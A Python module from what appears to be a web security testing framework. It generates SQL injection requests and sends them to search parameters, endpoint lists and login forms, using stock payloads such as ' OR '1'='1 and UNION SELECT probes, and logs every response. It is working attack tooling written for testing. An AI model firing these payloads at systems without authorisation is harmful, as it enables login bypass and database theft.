from __future__ import annotations

from dataclasses import dataclass
from time import perf_counter, sleep
from typing import Any, Dict, List

from ..http_client import AttackHttpClient
from ..logging_utils import AttackLogger
from ..models import ModuleResult, RequestAction
from .base import AttackModule, ModuleContext


DEFAULT_SQLI_PAYLOADS: List[str] = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' UNION SELECT NULL--",
    "admin'--",
]


@dataclass(slots=True)
class SqlInjectionRequest:
    kind: str
    method: str
    path: str
    label: str
    parameter_name: str
    parameter_value: str
    params: Dict[str, Any]
    data: Dict[str, Any]
    headers: Dict[str, str]


def _stringify_mapping(value: Any) -> Dict[str, str]:
    return {str(key): str(item) for key, item in dict(value or {}).items()}


class SqlInjectionModule(AttackModule):
    name = "sql_injection"

    def _payloads_for(self, config: Dict[str, Any], scenario: Dict[str, Any]) -> List[str]:
        return [
            str(value)
            for value in scenario.get("payloads", config.get("payloads", DEFAULT_SQLI_PAYLOADS))
        ]

    def _build_default_requests(self, config: Dict[str, Any]) -> List[SqlInjectionRequest]:
        requests: List[SqlInjectionRequest] = []
        global_headers = _stringify_mapping(config.get("headers", {}))

        if config.get("scenarios"):
            return self._build_scenario_requests(config, config["scenarios"], global_headers)

        legacy_requests = [
            {
                "type": "parameter",
                "label": "search-parameter",
                "endpoint": config.get("target_path", "/search"),
                "method": config.get("method", "GET"),
                "parameter": config.get("parameter", "q"),
                "payloads": config.get("payloads", DEFAULT_SQLI_PAYLOADS),
            },
            {
                "type": "login",
                "label": "login-form",
                "endpoint": config.get("form_path", "/login"),
                "method": config.get("login_method", "POST"),
                "username_field": config.get("form_field", "username"),
                "password_field": config.get("password_field", "password"),
                "payloads": config.get("payloads", DEFAULT_SQLI_PAYLOADS),
            },
        ]
        return self._build_scenario_requests(config, legacy_requests, global_headers)

    def _build_scenario_requests(
        self,
        config: Dict[str, Any],
        scenarios: List[Dict[str, Any]],
        global_headers: Dict[str, str],
    ) -> List[SqlInjectionRequest]:
        requests: List[SqlInjectionRequest] = []
        for scenario_index, scenario in enumerate(scenarios, start=1):
            scenario_type = str(scenario.get("type", "parameter"))
            label_prefix = str(scenario.get("label", f"sqli-scenario-{scenario_index}"))
            path = str(scenario.get("endpoint", scenario.get("path", "/search")))
            method = str(scenario.get("method", "POST" if scenario_type == "login" else "GET"))
            headers = {**global_headers, **_stringify_mapping(scenario.get("headers", {}))}
            payloads = self._payloads_for(config, scenario)

            if scenario_type == "login":
                username_field = str(scenario.get("username_field", config.get("form_field", "username")))
                password_field = str(scenario.get("password_field", config.get("password_field", "password")))
                for payload_index, payload in enumerate(payloads, start=1):
                    requests.append(
                        SqlInjectionRequest(
                            kind="login",
                            method=method,
                            path=path,
                            label=f"{label_prefix}-login-{payload_index}",
                            parameter_name=username_field,
                            parameter_value=payload,
                            params={},
                            data={username_field: payload, password_field: payload},
                            headers=headers,
                        )
                    )
                continue

            if scenario_type == "endpoint-list":
                parameter_name = str(scenario.get("parameter", config.get("parameter", "q")))
                for endpoint_index, endpoint in enumerate(
                    [str(value.get("path", "")) for value in scenario.get("endpoints", [])],
                    start=1,
                ):
                    for payload_index, payload in enumerate(payloads, start=1):
                        requests.append(
                            SqlInjectionRequest(
                                kind="endpoint-list",
                                method=method,
                                path=endpoint,
                                label=f"{label_prefix}-endpoint-{endpoint_index}-{payload_index}",
                                parameter_name=parameter_name,
                                parameter_value=payload,
                                params={parameter_name: payload},
                                data={},
                                headers=headers,
                            )
                        )
                continue

            parameter_name = str(scenario.get("parameter", config.get("parameter", "q")))
            for payload_index, payload in enumerate(payloads, start=1):
                requests.append(
                    SqlInjectionRequest(
                        kind="parameter",
                        method=method,
                        path=path,
                        label=f"{label_prefix}-param-{payload_index}",
                        parameter_name=parameter_name,
                        parameter_value=payload,
                        params={parameter_name: payload},
                        data={},
                        headers=headers,
                    )
                )

        return requests

    def run(self, client: AttackHttpClient, logger: AttackLogger, context: ModuleContext) -> ModuleResult:
        started = perf_counter()
        records = []
        config = context.module_config
        delay_ms = float(config.get("delay_ms", 0.0))
        requests = self._build_default_requests(config)

        for index, request_template in enumerate(requests, start=1):
            outcome = client.send(
                RequestAction(
                    method=request_template.method,
                    path=request_template.path,
                    params=request_template.params,
                    data=request_template.data,
                    headers={"X-Attack-Test": "sql-injection", **request_template.headers},
                    label=request_template.label,
                ),
                module_name=self.name,
                scenario_name=context.scenario_name,
            )
            outcome.record.execution_status = "success" if outcome.record.status_code is not None else "request_failed"
            outcome.record.tested_parameters = {
                request_template.parameter_name: request_template.parameter_value,
                **request_template.params,
            }
            logger.log_request(outcome.record)
            records.append(outcome.record)

            if delay_ms > 0 and index < len(requests):
                sleep(delay_ms / 1000.0)

        duration_ms = (perf_counter() - started) * 1000.0
        validation_summary = {
            "request_count": len(records),
            "profile": client.profile.name,
            "persistent_session": client.profile.persistent_session,
            "delay_ms": delay_ms,
            "scenario_count": len(config.get("scenarios", [])) if config.get("scenarios") else 1,
            "all_logged": len(records) == len(requests),
            "endpoint_targets": sorted({record.url for record in records}),
        }
        result = ModuleResult(
            module=self.name,
            success=all(record.execution_status != "request_failed" for record in records),
            request_count=len(records),
            duration_ms=round(duration_ms, 2),
            details=records,
            validation_summary=validation_summary,
            error="" if records else "No SQL injection requests were generated",
        )
        logger.log_module_result(result)
        return result
